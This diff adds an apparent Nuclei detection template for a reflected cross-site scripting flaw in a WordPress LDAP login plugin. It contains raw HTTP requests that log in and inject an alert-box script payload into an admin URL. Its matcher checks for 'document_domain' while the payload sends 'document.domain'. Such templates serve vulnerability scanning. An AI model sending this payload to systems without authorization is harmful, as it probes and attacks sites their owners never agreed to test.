@@ -1,0 +1,36 @@
+id: ldap-wp-login-xss
+
+info:
+  name: Ldap WP Login / Active Directory Integration < 3.0.2 - Cross-Site Scripting
+  author: r3Y3r53
+  severity: medium
+  description: |
+    The plugin does not escape generated URLs before outputing them in attrubutes, leading to Reflected Cross-Site Scripting
+  remediation: Fixed in version 3.0.2
+  reference:
+    - https://wpscan.com/vulnerability/1dc2cec8-e3dd-414b-8ccb-d73d51b051ee
+  metadata:
+    verified: true
+    max-request: 2
+  tags: xss,wp-plugin,wordpress,wp,ldap-wp-login-integration-with-active-directory,wpscan
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In
+      - |
+        GET /wp-admin/admin.php?page=LDAP+authentication+intergrating+with+AD&a"><script>alert(document.domain)</script> HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200'
+          - 'contains(header_2, "text/html")'
+          - 'contains_all(body_2, "<script>alert(document_domain)</script>", "LDAP-authentication-intergrating-with-AD")'
+        condition: and
+# digest: 4a0a004730450221009636b33e84d8f34dd9cf78357732d894bbe0705840e050c327e6baaff541552d0220187041e4f0458713c60715a78e88c74b1b38e281ff63412c8c2cd99c2af8dc58:922c64590222798bb761d5b6d8e72950
